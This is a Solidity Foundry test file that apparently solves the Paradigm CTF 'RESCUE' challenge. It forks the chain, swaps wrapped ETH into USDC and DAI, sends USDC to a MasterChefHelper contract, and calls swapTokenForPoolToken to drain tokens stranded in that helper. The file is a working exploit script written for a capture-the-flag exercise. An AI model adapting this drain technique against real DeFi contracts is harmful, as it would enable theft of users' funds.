// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/RESCUE/MasterChefHelper.sol";
import "../src/RESCUE/Setup.sol";
import "../src/RESCUE/UniswapV2Like.sol";
import "../src/mocks/ERC20Mock.sol";
import "../src/mocks/WETH9MOCK.sol";


contract ContractTest is Test {

    Setup public setup = Setup(0x4e4C4FC1e65B71f14F9e09099EF2B45AADe9879f);
    
    ERC20Mock weth = ERC20Mock(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ERC20Mock usdc = ERC20Mock(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ERC20Mock dai = ERC20Mock(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    function testExploit() public {
        vm.createSelectFork(vm.rpcUrl("paradigm"));
        MasterChefHelper mcHelper = setup.mcHelper();
        MasterChefLike masterchef = mcHelper.masterchef();
        UniswapV2RouterLike router = mcHelper.router();

        usdc.approve(address(router), type(uint256).max);
        weth.approve(address(router), type(uint256).max);
        dai.approve(address(router), type(uint256).max);
        usdc.approve(address(mcHelper), type(uint256).max);
        weth.approve(address(mcHelper), type(uint256).max);
        dai.approve(address(mcHelper), type(uint256).max);

        address(weth).call{value: 1000 ether}(abi.encodeWithSelector(0xd0e30db0));

        uint usdcWethPID = 1;
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(usdc);

        router.swapExactTokensForTokens(900 ether, 0, path, address(this), block.timestamp+100);
        
        path[1] = address(dai);
        router.swapExactTokensForTokens(100 ether, 0, path, address(this), block.timestamp+100);


        usdc.transfer(address(mcHelper), usdc.balanceOf(address(this)));

        mcHelper.swapTokenForPoolToken(usdcWethPID, address(dai), 100 ether, 0);

        assertEq(setup.isSolved(), true);

    }
}
